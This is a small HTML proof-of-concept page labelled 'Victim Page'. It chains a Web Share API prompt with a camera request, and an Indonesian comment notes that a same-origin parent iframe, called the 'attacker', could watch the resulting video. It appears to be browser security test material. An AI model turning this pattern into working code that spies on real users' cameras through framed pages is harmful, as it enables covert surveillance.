<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Victim Page</title>
<style>
  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
  video { width: 320px; height: 240px; background: black; border-radius: 12px; margin-top: 20px; }
  button { padding: 12px 25px; font-size: 16px; }
</style>
</head>
<body>

<h2>Victim Page</h2>
<video id="video" autoplay playsinline muted></video>
<br>
<button id="actionBtn">Share & Start Camera</button>

<script>
const video = document.getElementById("video");
const btn = document.getElementById("actionBtn");

btn.onclick = async () => {
  try {
    // 1️⃣ Trigger Web Share API dulu
    if (navigator.share) {
      await navigator.share({
        title: "WebShare + Camera",
        text: "Share dulu sebelum kamera aktif",
        url: location.href
      });
    } else {
      alert("Web Share API not supported");
    }

    // 2️⃣ Setelah Web Share selesai, start camera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Jika iframe parent sama-origin, attacker bisa lihat video
    if (window.parent !== window) {
      console.log("Camera started, attacker iframe can see this video");
    }

  } catch (err) {
    console.error("Error:", err);
  }
};
</script>

</body>
</html>
